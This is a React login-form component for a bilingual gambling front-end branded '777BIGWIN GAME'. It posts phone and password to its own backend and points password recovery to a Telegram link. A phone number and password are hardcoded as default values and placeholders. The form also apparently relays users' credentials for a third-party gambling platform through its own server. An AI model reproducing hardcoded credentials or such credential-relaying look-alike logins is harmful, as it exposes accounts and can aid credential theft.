import React, { useState } from 'react';
import { User, Lock, Eye, EyeOff, Check, AlertCircle, Loader2, Key } from 'lucide-react';
import { Platform } from '../types';
import { AccessDeniedModal } from './AccessDeniedModal';

interface LoginFormProps {
  platform: Platform;
  onPlatformChange: (p: Platform) => void;
  onLoginSuccess: (token: string, phone: string, userId: string, balance: number) => void;
  language: 'my' | 'en';
}

export const LoginForm: React.FC<LoginFormProps> = ({
  platform,
  onPlatformChange,
  onLoginSuccess,
  language
}) => {
  const [phone, setPhone] = useState('9791111116');
  const [password, setPassword] = useState('IsuzuDmax2');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [deniedGameId, setDeniedGameId] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');
    setDeniedGameId(null);

    if (!phone.trim()) {
      setErrorMsg(language === 'my' ? 'ဖုန်းနံပါတ် ထည့်သွင်းပါ' : 'Please enter your phone number');
      return;
    }
    if (!password) {
      setErrorMsg(language === 'my' ? 'လျှို့ဝှက်နံပါတ် ထည့်သွင်းပါ' : 'Please enter your password');
      return;
    }

    setLoading(true);
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: phone.trim(), password, platform })
      });

      let data: any = null;
      const contentType = res.headers.get('content-type') || '';
      if (contentType.includes('application/json')) {
        data = await res.json();
      } else {
        const text = await res.text();
        try {
          data = JSON.parse(text);
        } catch {
          throw new Error(text.slice(0, 80) || `Server error (${res.status})`);
        }
      }

      if (data.accessDenied) {
        // Show ACCESS DENIED modal
        setDeniedGameId(data.gameId || '761699');
        return;
      }

      if (data.success && data.token) {
        const balance = data.balance ?? 0;
        const userId = data.gameId || '777_USER';
        onLoginSuccess(data.token, phone.trim(), userId, balance);
      } else {
        setErrorMsg(data.message || (language === 'my' ? 'အကောင့်ဝင်ရောက်မှု မအောင်မြင်ပါ' : 'Login failed. Please verify credentials.'));
      }
    } catch (err: any) {
      setErrorMsg(err?.message || 'Connection error with 777 server');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-md mx-auto px-4 pb-12">
      {/* Access Denied Modal matching screenshot */}
      {deniedGameId && (
        <AccessDeniedModal
          gameId={deniedGameId}
          onBackToLogin={() => setDeniedGameId(null)}
          language={language}
        />
      )}

      {/* Dark container with subtle glowing red border as in screenshot */}
      <div className="relative bg-[#111217]/95 border-2 border-red-950/70 rounded-3xl p-5 shadow-2xl overflow-hidden backdrop-blur-xl">
        {/* Glow corner accents */}
        <div className="absolute top-0 right-0 w-32 h-32 bg-red-600/10 rounded-full blur-2xl pointer-events-none" />

        <form onSubmit={handleSubmit} className="space-y-5">
          {/* 1. CHOOSE PLATFORM */}
          <div>
            <div className="flex items-center gap-2 mb-3">
              <span className="w-5 h-5 rounded-md bg-red-600 text-white text-xs font-black flex items-center justify-center">
                1
              </span>
              <label className="text-xs font-black uppercase tracking-wider text-slate-200">
                {language === 'my' ? 'ပလက်ဖောင်း' : 'CHOOSE PLATFORM'}
              </label>
            </div>

            <div>
              {/* 777BIGWIN CARD ONLY */}
              <div
                className="relative p-3.5 rounded-2xl flex items-center justify-between gap-3 bg-[#181922] border-2 border-red-600 shadow-[0_0_15px_rgba(220,38,38,0.35)]"
              >
                <div className="flex items-center gap-3">
                  {/* 777 BigWin Logo Emblem */}
                  <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500 to-emerald-700 flex flex-col items-center justify-center p-1 text-center shadow-md border border-emerald-300/30 shrink-0">
                    <span className="text-white text-[12px] font-black tracking-tight leading-tight">
                      777BIGWIN
                    </span>
                    <span className="text-yellow-300 text-[8px] font-black tracking-widest mt-0.5">
                      GAME
                    </span>
                  </div>

                  <div>
                    <span className="text-sm font-black text-white uppercase tracking-wide block">
                      777BIGWIN GAME
                    </span>
                    <span className="text-[11px] text-emerald-400 font-semibold flex items-center gap-1 mt-0.5">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                      Official Active
                    </span>
                  </div>
                </div>

                {/* Red checkmark badge */}
                <div className="w-6 h-6 rounded-full bg-red-600 flex items-center justify-center shadow-md shrink-0">
                  <Check className="w-4 h-4 text-white stroke-[3]" />
                </div>
              </div>
            </div>
          </div>

          {/* 2. USERNAME */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="w-5 h-5 rounded-md bg-red-600 text-white text-xs font-black flex items-center justify-center">
                2
              </span>
              <label className="text-xs font-black uppercase tracking-wider text-slate-200">
                {language === 'my' ? 'အကောင့် ဖုန်းနံပါတ်' : 'USERNAME (PHONE)'}
              </label>
            </div>

            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
                <User className="w-4 h-4" />
              </div>
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                placeholder="9791111116"
                className="w-full bg-[#181920] border border-slate-800 focus:border-red-500 rounded-xl pl-10 pr-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:ring-1 focus:ring-red-500/50 transition-all font-mono"
              />
            </div>
            <p className="text-[10px] text-slate-500 mt-1 pl-1">
              {language === 'my'
                ? '* 95 မပါဘဲ ဖုန်းနံပါတ် ရိုက်ထည့်ပါ (ဥပမာ 9791111116)'
                : '* Enter phone number without country code 95 (e.g. 9791111116)'}
            </p>
          </div>

          {/* 3. PASSWORD */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="w-5 h-5 rounded-md bg-red-600 text-white text-xs font-black flex items-center justify-center">
                3
              </span>
              <label className="text-xs font-black uppercase tracking-wider text-slate-200">
                {language === 'my' ? 'လျှို့ဝှက်နံပါတ်' : 'PASSWORD'}
              </label>
            </div>

            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
                <Lock className="w-4 h-4" />
              </div>
              <input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="IsuzuDmax2"
                className="w-full bg-[#181920] border border-slate-800 focus:border-red-500 rounded-xl pl-10 pr-10 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:ring-1 focus:ring-red-500/50 transition-all font-mono"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute inset-y-0 right-0 pr-3.5 flex items-center text-slate-500 hover:text-slate-300 transition-colors cursor-pointer"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>

          {/* Remember Me & Forgot Password */}
          <div className="flex items-center justify-between text-xs text-slate-400 pt-1">
            <label className="flex items-center gap-2 cursor-pointer select-none">
              <input
                type="checkbox"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                className="w-4 h-4 rounded bg-[#181920] border-slate-700 text-red-600 focus:ring-red-500/30 accent-red-600"
              />
              <span>{language === 'my' ? 'မှတ်ထားရန်' : 'Remember me'}</span>
            </label>

            <button
              type="button"
              onClick={() => window.open('https://t.me/trilionx2', '_blank')}
              className="text-red-400 hover:text-red-300 transition-colors cursor-pointer"
            >
              {language === 'my' ? 'စကားဝှက်မေ့နေပါသလား?' : 'Forgot Password?'}
            </button>
          </div>

          {/* Error Message */}
          {errorMsg && (
            <div className="p-3 bg-red-950/60 border border-red-800/80 rounded-xl flex items-start gap-2 text-xs text-red-200 animate-in fade-in">
              <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
              <div>
                <p className="font-semibold">{errorMsg}</p>
              </div>
            </div>
          )}

          {/* Submit Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-3.5 bg-gradient-to-r from-red-700 via-red-600 to-red-700 hover:from-red-600 hover:to-red-500 active:scale-[0.99] text-white font-black text-sm uppercase tracking-wider rounded-xl shadow-[0_0_20px_rgba(220,38,38,0.5)] transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>{language === 'my' ? 'ချိတ်ဆက်နေပါသည်...' : 'CONNECTING TO 777...'}</span>
              </>
            ) : (
              <>
                <Key className="w-4 h-4" />
                <span>{language === 'my' ? 'အကောင့်ဝင်ရောက်မည်' : 'SIGN IN NOW'}</span>
              </>
            )}
          </button>
        </form>
      </div>
    </div>
  );
};
